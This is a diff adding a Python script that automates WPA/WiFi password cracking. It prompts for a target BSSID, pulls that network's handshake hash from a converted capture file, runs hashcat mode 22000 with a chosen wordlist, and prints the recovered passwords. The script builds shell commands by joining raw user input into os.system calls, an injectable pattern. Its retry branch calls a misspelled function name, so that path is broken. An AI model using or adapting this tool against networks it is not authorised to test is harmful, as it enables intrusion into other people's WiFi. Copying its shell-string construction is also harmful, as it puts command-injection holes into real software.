@@ -1,0 +1,31 @@
+#!/usr/bin/python3
+
+import os ,sys
+import termcolor
+from termcolor import colored , cprint
+import time
+
+def IamHereCrackMe():
+    print("")
+    os.system("cat /root/ReconToCrack/output/BSSID.txt")
+    print("")
+    print("")
+    Extract=input(termcolor.colored("[+]Target Bssid : " , "red",attrs=["bold"]))
+    print("")
+    cprint("[+]Extract Hash From Converted File","yellow",attrs=["bold"])
+    print("")
+    Hacks=("> /root/ReconToCrack/Result/TargetHash.hc22000")
+    os.system("cat  /root/ReconToCrack/output/Convert.hc22000 | grep" + "\t" + Extract + "\t" + Hacks)
+    if os.path.exists("/root/ReconToCrack/Result/TargetHash.hc22000"):
+       cprint("")
+       cprint("[+]Done TARGET FILE TargetHash.hc22000  ","yellow",attrs=["bold"])     
+       cprint("[+]Start Cracking ","yellow",attrs=["bold"]) 
+       print("")
+       world=input(termcolor.colored("[+]wordlists : " , "red",attrs=["bold"]))
+       print("")
+       os.system("hashcat -m 22000 /root/ReconToCrack/Result/TargetHash.hc22000 " + "\t" + world) 
+       print("")
+       os.system("cat /root/.local/share/hashcat/hashcat.potfile")
+    else:
+          IamHereCrackme()    
+IamHereCrackMe()
